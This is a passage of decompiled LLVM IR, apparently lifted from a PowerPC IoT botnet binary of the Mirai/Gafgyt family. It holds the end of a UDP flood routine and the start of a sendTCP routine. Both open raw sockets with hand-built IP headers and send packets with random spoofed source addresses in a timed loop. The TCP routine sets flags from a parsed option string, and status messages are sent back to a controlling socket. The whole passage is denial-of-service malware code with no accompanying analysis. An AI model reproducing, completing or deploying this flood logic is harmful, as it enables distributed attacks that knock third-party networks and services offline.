  %v1_1000914c = call i32 @__GI_time(i32 0)
  %v3_10009158 = icmp sgt i32 %v1_1000914c, %v2_100090dc
  br i1 %v3_10009158, label %dec_label_pc_100095d8, label %dec_label_pc_10009160

dec_label_pc_10009160:                            ; preds = %dec_label_pc_10009148
  br label %dec_label_pc_100090f8

dec_label_pc_1000916c:                            ; preds = %dec_label_pc_100090f8
  %v1_10009170 = add i32 %stack_var_-44.0, 1
  %v4_10009180 = icmp eq i32 %stack_var_-48.0.ph, %arg7
  br i1 %v4_10009180, label %dec_label_pc_10009188, label %dec_label_pc_100091a4

dec_label_pc_10009188:                            ; preds = %dec_label_pc_1000916c
  store i32 ptrtoint ([3 x i8]* @global_var_10009198.356 to i32), i32* @lr, align 4
  %v2_10009194 = call i32 @usleep(i32 %v1_1000918c, i32 %arg7)
  br label %dec_label_pc_100090f8.outer.backedge

dec_label_pc_100090f8.outer.backedge:             ; preds = %dec_label_pc_10009188, %dec_label_pc_100091a4
  %storemerge27 = phi i32 [ %v1_100091a8, %dec_label_pc_100091a4 ], [ 0, %dec_label_pc_10009188 ]
  br label %dec_label_pc_100090f8.outer

dec_label_pc_100091a4:                            ; preds = %dec_label_pc_1000916c
  %v1_100091a8 = add i32 %stack_var_-48.0.ph, 1
  br label %dec_label_pc_100090f8.outer.backedge

dec_label_pc_100091b4:                            ; preds = %dec_label_pc_1000900c
  store i32 268472780, i32* @lr, align 4
  %v3_100091c8 = call i32 @socket(i32 2, i32 3, i32 17)
  %v3_100091d8 = icmp eq i32 %v3_100091c8, 0
  br i1 %v3_100091d8, label %dec_label_pc_100091e0, label %dec_label_pc_10009200

dec_label_pc_100091e0:                            ; preds = %dec_label_pc_100091b4
  %v3_100091e4 = load i32, i32* @global_var_100285b0.29, align 4
  store i32 ptrtoint (i32* @global_var_100091fc.357 to i32), i32* @lr, align 4
  %v4_100091f8 = call i32 @sockprintf(i32 %v3_100091e4, i32 ptrtoint ([27 x i8]* @global_var_10015f28.353 to i32), i32 268500992)
  br label %dec_label_pc_100095c8

dec_label_pc_10009200:                            ; preds = %dec_label_pc_100091b4
  store i32 1, i32* %stack_var_-96, align 4
  %v2_10009208 = ptrtoint i32* %stack_var_-96 to i32
  store i32 268472868, i32* @lr, align 4
  %v5_10009220 = call i32 @__GI_setsockopt(i32 %v3_100091c8, i32 0, i32 3, i32 %v2_10009208, i32 4)
  %tmp77 = icmp sgt i32 %v5_10009220, -1
  br i1 %tmp77, label %dec_label_pc_10009250, label %dec_label_pc_10009230

dec_label_pc_10009230:                            ; preds = %dec_label_pc_10009200
  %v3_10009234 = load i32, i32* @global_var_100285b0.29, align 4
  store i32 ptrtoint (i32* @global_var_1000924c.359 to i32), i32* @lr, align 4
  %v4_10009248 = call i32 @sockprintf(i32 %v3_10009234, i32 ptrtoint ([33 x i8]* @global_var_10015f44.358 to i32), i32 268500992)
  br label %dec_label_pc_100095c8

dec_label_pc_10009250:                            ; preds = %dec_label_pc_10009200
  br label %dec_label_pc_1000925c

dec_label_pc_1000925c:                            ; preds = %dec_label_pc_10009250, %dec_label_pc_1000925c
  %v1_1000929422 = phi i32 [ 49, %dec_label_pc_10009250 ], [ %v1_10009294, %dec_label_pc_1000925c ]
  store i32 268472932, i32* @lr, align 4
  %v1_10009260 = call i32 @__GI_time(i32 0)
  %v0_1000926c = call i32 @rand_cmwc()
  %v2_10009274 = xor i32 %v1_10009260, %v0_1000926c
  store i32 ptrtoint (i32* @global_var_10009280.360 to i32), i32* @lr, align 4
  %v1_1000927c = call i32 @srand(i32 %v2_10009274)
  store i32 268472964, i32* @lr, align 4
  %v0_10009280 = call i32 @random()
  %v1_1000928c = call i32 @init_rand(i32 %v0_10009280)
  %v1_10009294 = add nsw i32 %v1_1000929422, -1
  %v4_100092a4 = icmp eq i32 %v1_1000929422, 0
  br i1 %v4_100092a4, label %dec_label_pc_100092ac, label %dec_label_pc_1000925c

dec_label_pc_100092ac:                            ; preds = %dec_label_pc_1000925c
  %v3_100092b0 = icmp eq i32 %arg4, 0
  br i1 %v3_100092b0, label %dec_label_pc_100092dc, label %dec_label_pc_100092c4

dec_label_pc_100092c4:                            ; preds = %dec_label_pc_100092ac
  %v1_100092c8 = sub i32 32, %arg4
  %v2_100092d0 = urem i32 %v1_100092c8, 64
  %v1_100092d4 = shl i32 -1, %v2_100092d0
  br label %dec_label_pc_100092dc

dec_label_pc_100092dc:                            ; preds = %dec_label_pc_100092ac, %dec_label_pc_100092c4
  %storemerge10 = phi i32 [ %v1_100092d4, %dec_label_pc_100092c4 ], [ 0, %dec_label_pc_100092ac ]
  %v1_100092e0 = add i32 %arg5, 28
  %v1_100092f0 = add i32 %arg5, 58
  %v1_100092f4 = and i32 %v1_100092f0, -16
  %v2_100092fc = load i32, i32* %stack_var_-160, align 4
  %v1_10009304 = load i32, i32* @r1, align 4
  %v3_10009304 = sub i32 %v1_10009304, %v1_100092f4
  %v4_10009304 = inttoptr i32 %v3_10009304 to i32*
  store i32 %v2_100092fc, i32* %v4_10009304, align 4
  %v1_10009314 = add i32 %v3_10009304, 23
  %v1_10009318 = and i32 %v1_10009314, -16
  %v1_10009338 = add i32 %v1_10009318, 20
  %v5_1000933c = inttoptr i32 %v1_10009338 to i16*
  %v3_10009340 = load i32, i32* %stack_var_-108, align 4
  %v1_10009348 = call i32 @GetRandomIP(i32 %storemerge10)
  store i32 %v1_10009348, i32* @r3, align 4
  %v1_10009354 = call i32 @htonl(i32 %v1_10009348)
  %v1_10009360 = add i32 %arg5, 8
  %v6_10009378 = inttoptr i32 %v1_10009318 to i32*
  %v7_10009378 = call i32 @makeIPPacket(i32* %v6_10009378, i32 %v3_10009340, i32 %v1_10009354, i32 17, i32 %v1_10009360, i32 %arg5)
  %v1_10009388 = urem i32 %v1_10009360, 65536
  store i32 %v1_10009388, i32* @r3, align 4
  %v1_10009390 = call i32 @htons(i32 %v1_10009388)
  %sext = mul i32 %v1_10009390, 65536
  %v1_10009394 = sdiv i32 %sext, 65536
  %v1_1000939c = trunc i32 %v1_10009394 to i16
  %v3_1000939c = add i32 %v1_10009318, 24
  %v4_1000939c = inttoptr i32 %v3_1000939c to i16*
  store i16 %v1_1000939c, i16* %v4_1000939c, align 8
  %v0_100093a0 = call i32 @rand_cmwc()
  %v1_100093b0 = trunc i32 %v0_100093a0 to i16
  store i16 %v1_100093b0, i16* %v5_1000933c, align 4
  br i1 %v3_10008fb8, label %dec_label_pc_100093c0, label %dec_label_pc_100093d4

dec_label_pc_100093c0:                            ; preds = %dec_label_pc_100092dc
  %v0_100093c0 = call i32 @rand_cmwc()
  %extract.t87 = trunc i32 %v0_100093c0 to i16
  br label %dec_label_pc_100093ec

dec_label_pc_100093d4:                            ; preds = %dec_label_pc_100092dc
  %v1_100093d8 = urem i32 %arg2, 65536
  store i32 %v1_100093d8, i32* @r3, align 4
  %v1_100093e0 = call i32 @htons(i32 %v1_100093d8)
  %extract.t = trunc i32 %v1_100093e0 to i16
  br label %dec_label_pc_100093ec

dec_label_pc_100093ec:                            ; preds = %dec_label_pc_100093c0, %dec_label_pc_100093d4
  %storemerge78.off0 = phi i16 [ %extract.t, %dec_label_pc_100093d4 ], [ %extract.t87, %dec_label_pc_100093c0 ]
  %v1_100094cc.pre-phi = phi i32 [ %v1_100093d8, %dec_label_pc_100093d4 ], [ 0, %dec_label_pc_100093c0 ]
  %v3_100093f4 = add i32 %v1_10009318, 22
  %v4_100093f4 = inttoptr i32 %v3_100093f4 to i16*
  store i16 %storemerge78.off0, i16* %v4_100093f4, align 2
  %v3_10009400 = add i32 %v1_10009318, 26
  %v4_10009400 = inttoptr i32 %v3_10009400 to i16*
  store i16 0, i16* %v4_10009400, align 2
  %v1_10009408 = add i32 %v1_10009318, 28
  %v2_10009414 = call i32 @makeRandomStr(i32 %v1_10009408, i32 %arg5)
  %v1_10009424 = or i32 %v1_10009318, 2
  %v2_10009424 = inttoptr i32 %v1_10009424 to i16*
  %v3_10009424 = load i16, i16* %v2_10009424, align 2
  %v4_10009424 = zext i16 %v3_10009424 to i32
  %v5_10009434 = inttoptr i32 %v1_10009318 to i16*
  %v6_10009434 = call i32 @csum(i16* %v5_10009434, i32 %v4_10009424, i32 %v1_10009318, i32 17, i32 %v1_10009360)
  %sext4 = mul i32 %v6_10009434, 65536
  %v1_10009438 = sdiv i32 %sext4, 65536
  %v1_10009440 = trunc i32 %v1_10009438 to i16
  %v3_10009440 = or i32 %v1_10009318, 10
  %v4_10009440 = inttoptr i32 %v3_10009440 to i16*
  store i16 %v1_10009440, i16* %v4_10009440, align 2
  store i32 268473420, i32* @lr, align 4
  %v1_10009448 = call i32 @__GI_time(i32 0)
  %v2_10009454 = add i32 %v1_10009448, %arg3
  %v3_100094fc = or i32 %v1_10009318, 4
  %v4_100094fc = inttoptr i32 %v3_100094fc to i16*
  %v2_1000951c = or i32 %v1_10009318, 12
  %v3_1000951c = inttoptr i32 %v2_1000951c to i32*
  %v1_100095a0 = mul i32 %v0_10008fa8, 1000
  br label %dec_label_pc_10009470.outer

dec_label_pc_10009470.outer:                      ; preds = %dec_label_pc_10009470.outer.backedge, %dec_label_pc_100093ec
  %stack_var_-56.0.ph = phi i32 [ 0, %dec_label_pc_100093ec ], [ %storemerge26, %dec_label_pc_10009470.outer.backedge ]
  %stack_var_-52.0.ph = phi i32 [ 0, %dec_label_pc_100093ec ], [ %v1_10009584, %dec_label_pc_10009470.outer.backedge ]
  br label %dec_label_pc_10009470

dec_label_pc_10009470:                            ; preds = %dec_label_pc_10009470.outer, %dec_label_pc_10009574
  %stack_var_-52.0 = phi i32 [ 0, %dec_label_pc_10009574 ], [ %stack_var_-52.0.ph, %dec_label_pc_10009470.outer ]
  store i32 268473492, i32* @lr, align 4
  %v7_10009490 = call i32 @__libc_sendto(i32 %v3_100091c8, i32 %v1_10009318, i32 %v1_100092e0, i32 0, i32 %v2_10008fec, i32 16, i32 %v2_10008fec)
  %v0_10009494 = call i32 @rand_cmwc()
  %v1_100094a4 = trunc i32 %v0_10009494 to i16
  store i16 %v1_100094a4, i16* %v5_1000933c, align 4
  br i1 %v3_10008fb8, label %dec_label_pc_100094b4, label %dec_label_pc_100094c8

dec_label_pc_100094b4:                            ; preds = %dec_label_pc_10009470
  %v0_100094b4 = call i32 @rand_cmwc()
  %extract.t89 = trunc i32 %v0_100094b4 to i16
  br label %dec_label_pc_100094e0

dec_label_pc_100094c8:                            ; preds = %dec_label_pc_10009470
  store i32 %v1_100094cc.pre-phi, i32* @r3, align 4
  %v1_100094d4 = call i32 @htons(i32 %v1_100094cc.pre-phi)
  %extract.t88 = trunc i32 %v1_100094d4 to i16
  br label %dec_label_pc_100094e0

dec_label_pc_100094e0:                            ; preds = %dec_label_pc_100094b4, %dec_label_pc_100094c8
  %storemerge80.off0 = phi i16 [ %extract.t88, %dec_label_pc_100094c8 ], [ %extract.t89, %dec_label_pc_100094b4 ]
  store i16 %storemerge80.off0, i16* %v4_100093f4, align 2
  %v0_100094ec = call i32 @rand_cmwc()
  %v1_100094fc = trunc i32 %v0_100094ec to i16
  store i16 %v1_100094fc, i16* %v4_100094fc, align 4
  %v1_10009504 = call i32 @GetRandomIP(i32 %storemerge10)
  store i32 %v1_10009504, i32* @r3, align 4
  %v1_10009510 = call i32 @htonl(i32 %v1_10009504)
  store i32 %v1_10009510, i32* %v3_1000951c, align 4
  %v3_1000952c = load i16, i16* %v2_10009424, align 2
  %v4_1000952c = zext i16 %v3_1000952c to i32
  %v6_1000953c = call i32 @csum(i16* %v5_10009434, i32 %v4_1000952c, i32 %v1_10009318, i32 0, i32 %v2_10008fec)
  %v1_10009548 = trunc i32 %v6_1000953c to i16
  store i16 %v1_10009548, i16* %v4_10009440, align 2
  %v4_10009554 = icmp eq i32 %stack_var_-52.0, %arg6
  br i1 %v4_10009554, label %dec_label_pc_1000955c, label %dec_label_pc_10009580

dec_label_pc_1000955c:                            ; preds = %dec_label_pc_100094e0
  store i32 268473700, i32* @lr, align 4
  %v1_10009560 = call i32 @__GI_time(i32 0)
  %v3_1000956c = icmp sgt i32 %v1_10009560, %v2_10009454
  br i1 %v3_1000956c, label %dec_label_pc_100095c8, label %dec_label_pc_10009574

dec_label_pc_10009574:                            ; preds = %dec_label_pc_1000955c
  br label %dec_label_pc_10009470

dec_label_pc_10009580:                            ; preds = %dec_label_pc_100094e0
  %v1_10009584 = add i32 %stack_var_-52.0, 1
  %v4_10009594 = icmp eq i32 %stack_var_-56.0.ph, %arg7
  br i1 %v4_10009594, label %dec_label_pc_1000959c, label %dec_label_pc_100095b8

dec_label_pc_1000959c:                            ; preds = %dec_label_pc_10009580
  store i32 ptrtoint ([3 x i8]* @global_var_100095ac.361 to i32), i32* @lr, align 4
  %v2_100095a8 = call i32 @usleep(i32 %v1_100095a0, i32 %arg7)
  br label %dec_label_pc_10009470.outer.backedge

dec_label_pc_10009470.outer.backedge:             ; preds = %dec_label_pc_1000959c, %dec_label_pc_100095b8
  %storemerge26 = phi i32 [ %v1_100095bc, %dec_label_pc_100095b8 ], [ 0, %dec_label_pc_1000959c ]
  br label %dec_label_pc_10009470.outer

dec_label_pc_100095b8:                            ; preds = %dec_label_pc_10009580
  %v1_100095bc = add i32 %stack_var_-56.0.ph, 1
  br label %dec_label_pc_10009470.outer.backedge

dec_label_pc_100095c8:                            ; preds = %dec_label_pc_1000955c, %dec_label_pc_10009230, %dec_label_pc_100091e0
  %v0_100095f031 = phi i32 [ %v4_10009248, %dec_label_pc_10009230 ], [ %v4_100091f8, %dec_label_pc_100091e0 ], [ %v1_10009560, %dec_label_pc_1000955c ]
  br label %dec_label_pc_100095d8

dec_label_pc_100095d8:                            ; preds = %dec_label_pc_10009148, %dec_label_pc_10008fec, %dec_label_pc_1000907c, %dec_label_pc_1000905c, %dec_label_pc_100095c8
  %v0_100095f0 = phi i32 [ %v4_10008ffc, %dec_label_pc_10008fec ], [ 0, %dec_label_pc_1000907c ], [ %v4_10009074, %dec_label_pc_1000905c ], [ %v0_100095f031, %dec_label_pc_100095c8 ], [ %v1_1000914c, %dec_label_pc_10009148 ]
  ret i32 %v0_100095f0

; uselistorder directives
  uselistorder i32 %v1_100094cc.pre-phi, { 1, 0 }
  uselistorder i32 %v1_100093d8, { 2, 1, 0 }
  uselistorder i32 %v1_10009388, { 1, 0 }
  uselistorder i32 %v1_10009360, { 2, 0, 1 }
  uselistorder i32 %v1_10009318, { 10, 3, 1, 2, 4, 11, 0, 5, 6, 7, 8, 9, 12, 13 }
  uselistorder i32 %v2_10008fec, { 3, 5, 4, 2, 1, 0 }
  uselistorder i32 %v1_10008fd8, { 1, 0 }
  uselistorder i32* %stack_var_-112, { 1, 0 }
  uselistorder i32* %stack_var_-108, { 1, 0 }
  uselistorder i32* %stack_var_-96, { 1, 0 }
  uselistorder i32 (i32, i32)* @usleep, { 1, 0 }
  uselistorder i32 (i32, i32)* @makeRandomStr, { 1, 0 }
  uselistorder i32 %arg7, { 1, 3, 0, 2 }
  uselistorder i32 %arg5, { 1, 3, 2, 5, 4, 0, 6, 7 }
  uselistorder label %dec_label_pc_100095d8, { 4, 0, 2, 3, 1 }
  uselistorder label %dec_label_pc_10009470.outer.backedge, { 1, 0 }
  uselistorder label %dec_label_pc_100094e0, { 1, 0 }
  uselistorder label %dec_label_pc_10009470, { 1, 0 }
  uselistorder label %dec_label_pc_100093ec, { 1, 0 }
  uselistorder label %dec_label_pc_100092dc, { 1, 0 }
  uselistorder label %dec_label_pc_1000925c, { 1, 0 }
  uselistorder label %dec_label_pc_100090f8.outer.backedge, { 1, 0 }
  uselistorder label %dec_label_pc_10009148, { 1, 0 }
  uselistorder label %dec_label_pc_100090f8, { 1, 0 }
  uselistorder label %dec_label_pc_10008fec, { 1, 0 }
}

define i32 @sendTCP(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5, i32 %arg6, i32 %arg7) local_unnamed_addr {
entry:
  %stack_var_-76 = alloca i32, align 4
  %stack_var_-88 = alloca i32, align 4
  %stack_var_-92 = alloca i32, align 4
  %stack_var_-128 = alloca i32, align 4
  %stack_var_0 = alloca i32, align 4
  %v4_100095f4 = ptrtoint i32* %stack_var_0 to i32
  store i32 %v4_100095f4, i32* %stack_var_-128, align 4
  store i32 2, i32* %stack_var_-92, align 4
  %v3_10009644 = icmp eq i32 %arg2, 0
  br i1 %v3_10009644, label %dec_label_pc_1000964c, label %dec_label_pc_10009660

dec_label_pc_1000964c:                            ; preds = %entry
  %v0_1000964c = call i32 @rand_cmwc()
  br label %dec_label_pc_10009678

dec_label_pc_10009660:                            ; preds = %entry
  %v1_10009664 = urem i32 %arg2, 65536
  store i32 %v1_10009664, i32* @r3, align 4
  %v1_1000966c = call i32 @htons(i32 %v1_10009664)
  br label %dec_label_pc_10009678

dec_label_pc_10009678:                            ; preds = %dec_label_pc_1000964c, %dec_label_pc_10009660
  %v2_10009678 = ptrtoint i32* %stack_var_-92 to i32
  %v4_10009688 = call i32 @getHost(i32 %arg1, i32* nonnull %stack_var_-88, i32 %v2_10009678)
  %v3_10009690 = icmp eq i32 %v4_10009688, 0
  br i1 %v3_10009690, label %dec_label_pc_1000969c, label %dec_label_pc_10009c20

dec_label_pc_1000969c:                            ; preds = %dec_label_pc_10009678
  store i32 268474052, i32* @lr, align 4
  %v3_100096c0 = call i32 @socket(i32 2, i32 3, i32 6)
  %v3_100096d0 = icmp eq i32 %v3_100096c0, 0
  br i1 %v3_100096d0, label %dec_label_pc_100096d8, label %dec_label_pc_100096f8

dec_label_pc_100096d8:                            ; preds = %dec_label_pc_1000969c
  %v3_100096dc = load i32, i32* @global_var_100285b0.29, align 4
  store i32 ptrtoint (i32* @global_var_100096f4.362 to i32), i32* @lr, align 4
  %v4_100096f0 = call i32 @sockprintf(i32 %v3_100096dc, i32 ptrtoint ([27 x i8]* @global_var_10015f28.353 to i32), i32 268500992)
  br label %dec_label_pc_10009c20

dec_label_pc_100096f8:                            ; preds = %dec_label_pc_1000969c
  store i32 1, i32* %stack_var_-76, align 4
  %v2_10009700 = ptrtoint i32* %stack_var_-76 to i32
  store i32 268474140, i32* @lr, align 4
  %v5_10009718 = call i32 @__GI_setsockopt(i32 %v3_100096c0, i32 0, i32 3, i32 %v2_10009700, i32 4)
  %tmp59 = icmp sgt i32 %v5_10009718, -1
  br i1 %tmp59, label %dec_label_pc_10009748, label %dec_label_pc_10009728

dec_label_pc_10009728:                            ; preds = %dec_label_pc_100096f8
  %v3_1000972c = load i32, i32* @global_var_100285b0.29, align 4
  store i32 ptrtoint (i32* @global_var_10009744.363 to i32), i32* @lr, align 4
  %v4_10009740 = call i32 @sockprintf(i32 %v3_1000972c, i32 ptrtoint ([33 x i8]* @global_var_10015f44.358 to i32), i32 268500992)
  br label %dec_label_pc_10009c20

dec_label_pc_10009748:                            ; preds = %dec_label_pc_100096f8
  %v3_1000974c = icmp eq i32 %arg4, 0
  br i1 %v3_1000974c, label %dec_label_pc_10009778, label %dec_label_pc_10009760

dec_label_pc_10009760:                            ; preds = %dec_label_pc_10009748
  %v1_10009764 = sub i32 32, %arg4
  %v2_1000976c = urem i32 %v1_10009764, 64
  %v1_10009770 = shl i32 -1, %v2_1000976c
  br label %dec_label_pc_10009778

dec_label_pc_10009778:                            ; preds = %dec_label_pc_10009748, %dec_label_pc_10009760
  %storemerge9 = phi i32 [ %v1_10009770, %dec_label_pc_10009760 ], [ 0, %dec_label_pc_10009748 ]
  %v1_1000977c = add i32 %arg6, 40
  %v1_1000978c = add i32 %arg6, 70
  %v1_10009790 = and i32 %v1_1000978c, -16
  %v2_10009798 = load i32, i32* %stack_var_-128, align 4
  %v1_100097a0 = load i32, i32* @r1, align 4
  %v3_100097a0 = sub i32 %v1_100097a0, %v1_10009790
  %v4_100097a0 = inttoptr i32 %v3_100097a0 to i32*
  store i32 %v2_10009798, i32* %v4_100097a0, align 4
  %v1_100097b0 = add i32 %v3_100097a0, 23
  %v1_100097b4 = and i32 %v1_100097b0, -16
  %v1_100097d4 = add i32 %v1_100097b4, 20
  %v5_100097d8 = inttoptr i32 %v1_100097d4 to i16*
  %v3_100097dc = load i32, i32* %stack_var_-88, align 4
  %v1_100097e4 = call i32 @GetRandomIP(i32 %storemerge9)
  store i32 %v1_100097e4, i32* @r3, align 4
  %v1_100097f0 = call i32 @htonl(i32 %v1_100097e4)
  %v1_100097fc = add i32 %arg6, 20
  %v6_10009814 = inttoptr i32 %v1_100097b4 to i32*
  %v7_10009814 = call i32 @makeIPPacket(i32* %v6_10009814, i32 %v3_100097dc, i32 %v1_100097f0, i32 6, i32 %v1_100097fc, i32 %arg6)
  %v0_10009818 = call i32 @rand_cmwc()
  %v1_10009828 = trunc i32 %v0_10009818 to i16
  store i16 %v1_10009828, i16* %v5_100097d8, align 4
  %v0_1000982c = call i32 @rand_cmwc()
  %v2_10009838 = add i32 %v1_100097b4, 24
  %v3_10009838 = inttoptr i32 %v2_10009838 to i32*
  store i32 %v0_1000982c, i32* %v3_10009838, align 8
  %v2_10009844 = add i32 %v1_100097b4, 28
  %v3_10009844 = inttoptr i32 %v2_10009844 to i32*
  store i32 0, i32* %v3_10009844, align 4
  %v1_1000984c = add i32 %v1_100097b4, 32
  %v2_1000984c = inttoptr i32 %v1_1000984c to i32*
  %v1_10009854 = call i32 @__asm_rlwimi(i32 5, i32 28, i32 0, i32 3)
  %v2_10009858 = add i32 %v1_100097b4, 32
  %v3_10009858 = inttoptr i32 %v2_10009858 to i32*
  store i32 %v1_10009854, i32* %v3_10009858, align 16
  store i32 ptrtoint ([4 x i8]* @global_var_10015f68.364 to i32), i32* @r4, align 4
  %v3_1000986c = inttoptr i32 %arg5 to i8*
  %v4_1000986c = call i32 @__GI_strcoll(i8* %v3_1000986c, i32 ptrtoint ([4 x i8]* @global_var_10015f68.364 to i32))
  %v3_10009874 = icmp eq i32 %v4_1000986c, 0
  br i1 %v3_10009874, label %dec_label_pc_1000987c, label %dec_label_pc_100098d0

dec_label_pc_1000987c:                            ; preds = %dec_label_pc_10009778
  %v3_10009880 = load i32, i32* %v2_1000984c, align 16
  %v1_100098c4 = or i32 %v3_10009880, 2031616
  store i32 %v1_100098c4, i32* %v2_1000984c, align 16
  br label %dec_label_pc_10009a38

dec_label_pc_100098d0:                            ; preds = %dec_label_pc_10009778
  store i32 ptrtoint (i32* @global_var_10015f6c.365 to i32), i32* @r4, align 4
  store i32 268474596, i32* @lr, align 4
  %v3_100098e0 = call i32 @__GI_strtok(i32 %arg5, i32 ptrtoint (i32* @global_var_10015f6c.365 to i32), i32 268500992)
  %v3_10009a3018 = icmp eq i32 %v3_100098e0, 0
  br i1 %v3_10009a3018, label %dec_label_pc_10009a38, label %dec_label_pc_100098f0

dec_label_pc_100098f0:                            ; preds = %dec_label_pc_100098d0, %dec_label_pc_10009a14
  %storemerge1319 = phi i32 [ %v3_10009a20, %dec_label_pc_10009a14 ], [ %v3_100098e0, %dec_label_pc_100098d0 ]
  store i32 ptrtoint ([4 x i8]* @global_var_10015f70.366 to i32), i32* @r4, align 4
  %v3_10009900 = inttoptr i32 %storemerge1319 to i8*
  %v4_10009900 = call i32 @__GI_strcoll(i8* %v3_10009900, i32 ptrtoint ([4 x i8]* @global_var_10015f70.366 to i32))
  %v3_10009908 = icmp eq i32 %v4_10009900, 0
  br i1 %v3_10009908, label %dec_label_pc_10009910, label %dec_label_pc_10009924

dec_label_pc_10009910:                            ; preds = %dec_label_pc_100098f0
  %v3_10009914 = load i32, i32* %v2_1000984c, align 16
  %v1_10009918 = or i32 %v3_10009914, 131072
  store i32 %v1_10009918, i32* %v2_1000984c, align 16
  br label %dec_label_pc_10009a14

dec_label_pc_10009924:                            ; preds = %dec_label_pc_100098f0
  store i32 ptrtoint ([4 x i8]* @global_var_10015f74.367 to i32), i32* @r4, align 4
  %v4_10009934 = call i32 @__GI_strcoll(i8* %v3_10009900, i32 ptrtoint ([4 x i8]* @global_var_10015f74.367 to i32))
  %v3_1000993c = icmp eq i32 %v4_10009934, 0
  br i1 %v3_1000993c, label %dec_label_pc_10009944, label %dec_label_pc_10009958

dec_label_pc_10009944:                            ; preds = %dec_label_pc_10009924
  %v3_10009948 = load i32, i32* %v2_1000984c, align 16
  %v1_1000994c = or i32 %v3_10009948, 262144
  store i32 %v1_1000994c, i32* %v2_1000984c, align 16
  br label %dec_label_pc_10009a14

dec_label_pc_10009958:                            ; preds = %dec_label_pc_10009924
  store i32 ptrtoint ([4 x i8]* @global_var_10015f78.368 to i32), i32* @r4, align 4
  %v4_10009968 = call i32 @__GI_strcoll(i8* %v3_10009900, i32 ptrtoint ([4 x i8]* @global_var_10015f78.368 to i32))
  %v3_10009970 = icmp eq i32 %v4_10009968, 0
  br i1 %v3_10009970, label %dec_label_pc_10009978, label %dec_label_pc_1000998c

dec_label_pc_10009978:                            ; preds = %dec_label_pc_10009958
  %v3_1000997c = load i32, i32* %v2_1000984c, align 16
  %v1_10009980 = or i32 %v3_1000997c, 65536
  store i32 %v1_10009980, i32* %v2_1000984c, align 16
  br label %dec_label_pc_10009a14

dec_label_pc_1000998c:                            ; preds = %dec_label_pc_10009958
  store i32 ptrtoint ([4 x i8]* @global_var_10015f7c.369 to i32), i32* @r4, align 4
  %v4_1000999c = call i32 @__GI_strcoll(i8* %v3_10009900, i32 ptrtoint ([4 x i8]* @global_var_10015f7c.369 to i32))
  %v3_100099a4 = icmp eq i32 %v4_1000999c, 0
  br i1 %v3_100099a4, label %dec_label_pc_100099ac, label %dec_label_pc_100099c0

dec_label_pc_100099ac:                            ; preds = %dec_label_pc_1000998c
  %v3_100099b0 = load i32, i32* %v2_1000984c, align 16
  %v1_100099b4 = or i32 %v3_100099b0, 1048576
  store i32 %v1_100099b4, i32* %v2_1000984c, align 16
  br label %dec_label_pc_10009a14

dec_label_pc_100099c0:                            ; preds = %dec_label_pc_1000998c
  store i32 ptrtoint ([4 x i8]* @global_var_10015f80.370 to i32), i32* @r4, align 4
  %v4_100099d0 = call i32 @__GI_strcoll(i8* %v3_10009900, i32 ptrtoint ([4 x i8]* @global_var_10015f80.370 to i32))
  %v3_100099d8 = icmp eq i32 %v4_100099d0, 0
  br i1 %v3_100099d8, label %dec_label_pc_100099e0, label %dec_label_pc_100099f4

dec_label_pc_100099e0:                            ; preds = %dec_label_pc_100099c0
  %v3_100099e4 = load i32, i32* %v2_1000984c, align 16
  %v1_100099e8 = or i32 %v3_100099e4, 524288
  store i32 %v1_100099e8, i32* %v2_1000984c, align 16
  br label %dec_label_pc_10009a14

dec_label_pc_100099f4:                            ; preds = %dec_label_pc_100099c0
  %v3_100099f8 = load i32, i32* @global_var_100285b0.29, align 4
  store i32 ptrtoint ([3 x i8]* @global_var_10009a14.372 to i32), i32* @lr, align 4
  %v5_10009a10 = call i32 @sockprintf(i32 %v3_100099f8, i32 ptrtoint ([18 x i8]* @global_var_10015f84.371 to i32), i32 %storemerge1319)
  br label %dec_label_pc_10009a14

dec_label_pc_10009a14:                            ; preds = %dec_label_pc_100099e0, %dec_label_pc_100099ac, %dec_label_pc_10009978, %dec_label_pc_10009944, %dec_label_pc_10009910, %dec_label_pc_100099f4
  store i32 ptrtoint (i32* @global_var_10015f6c.365 to i32), i32* @r4, align 4
  store i32 268474916, i32* @lr, align 4
  %v3_10009a20 = call i32 @__GI_strtok(i32 0, i32 ptrtoint (i32* @global_var_10015f6c.365 to i32), i32 268500992)
  %v3_10009a30 = icmp eq i32 %v3_10009a20, 0
  br i1 %v3_10009a30, label %dec_label_pc_10009a38, label %dec_label_pc_100098f0

dec_label_pc_10009a38:                            ; preds = %dec_label_pc_10009a14, %dec_label_pc_100098d0, %dec_label_pc_1000987c
  %v0_10009a38 = call i32 @rand_cmwc()
  %v1_10009a48 = trunc i32 %v0_10009a38 to i16
  %v3_10009a48 = add i32 %v1_100097b4, 34
  %v4_10009a48 = inttoptr i32 %v3_10009a48 to i16*
  store i16 %v1_10009a48, i16* %v4_10009a48, align 2
  %v3_10009a54 = add i32 %v1_100097b4, 36
  %v4_10009a54 = inttoptr i32 %v3_10009a54 to i16*
  store i16 0, i16* %v4_10009a54, align 4
  %v3_10009a60 = add i32 %v1_100097b4, 38
  %v4_10009a60 = inttoptr i32 %v3_10009a60 to i16*
  store i16 0, i16* %v4_10009a60, align 2
  br i1 %v3_10009644, label %dec_label_pc_10009a70, label %dec_label_pc_10009a84

dec_label_pc_10009a70:                            ; preds = %dec_label_pc_10009a38
  %v0_10009a70 = call i32 @rand_cmwc()
  %extract.t63 = trunc i32 %v0_10009a70 to i16
  br label %dec_label_pc_10009a9c

dec_label_pc_10009a84:                            ; preds = %dec_label_pc_10009a38
  %v1_10009a88 = urem i32 %arg2, 65536
  store i32 %v1_10009a88, i32* @r3, align 4
  %v1_10009a90 = call i32 @htons(i32 %v1_10009a88)
  %extract.t = trunc i32 %v1_10009a90 to i16
  br label %dec_label_pc_10009a9c

dec_label_pc_10009a9c:                            ; preds = %dec_label_pc_10009a70, %dec_label_pc_10009a84
  %storemerge60.off0 = phi i16 [ %extract.t, %dec_label_pc_10009a84 ], [ %extract.t63, %dec_label_pc_10009a70 ]
  %v3_10009aa4 = add i32 %v1_100097b4, 22
  %v4_10009aa4 = inttoptr i32 %v3_10009aa4 to i16*
  store i16 %storemerge60.off0, i16* %v4_10009aa4, align 2
  store i32 268475060, i32* @lr, align 4
  %v3_10009ab0 = inttoptr i32 %v1_100097d4 to i32*
  %v4_10009ab0 = call i32 @tcpcsum(i32 %v1_100097b4, i32* %v3_10009ab0, i32 %v1_100097d4)
  %v1_10009abc = trunc i32 %v4_10009ab0 to i16
  store i16 %v1_10009abc, i16* %v4_10009a54, align 4
  %v1_10009acc = or i32 %v1_100097b4, 2
